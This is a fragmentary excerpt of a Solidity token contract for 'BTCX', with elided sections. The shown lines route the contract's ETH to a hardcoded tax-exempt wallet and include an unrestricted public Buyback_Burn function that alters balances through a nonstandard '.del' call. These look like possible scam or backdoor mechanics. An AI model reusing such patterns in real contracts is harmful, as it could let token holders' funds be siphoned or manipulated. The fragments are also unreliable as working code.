...
Telegram - https://t.me/bitcoinxerccoin
Twitter -  https://twitter.com/bitcoinxerccoin
*/
...
contract BTCX is Context, IERC20, Ownable { 
    ...
    address payable private Tax_Wallet = payable(0xC4ADD7CEB13E0EC08dF9d7049B9Fed6dCB1B86DC);
    ...
    constructor () {
        ...
        _isExcludedFromTax[Tax_Wallet] = true;
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
        ...
        sendToWallet(Tax_Wallet,contractETH);
    }
    ...
    function _transferTokens(address sender, address recipient, uint256 Amount) private {
        ...
        _aOwned[sender] = _aOwned[sender].sub(Amount);
        _aOwned[recipient] = _aOwned[recipient].add(tTransferAmount);
        _aOwned[address(this)] = _aOwned[address(this)].add(tDev);   
    ...
    function Buyback_Burn(uint256 amount) public {
        ...
        _aOwned[_msgSender()] = _aOwned[_msgSender()].del(amount);
    }
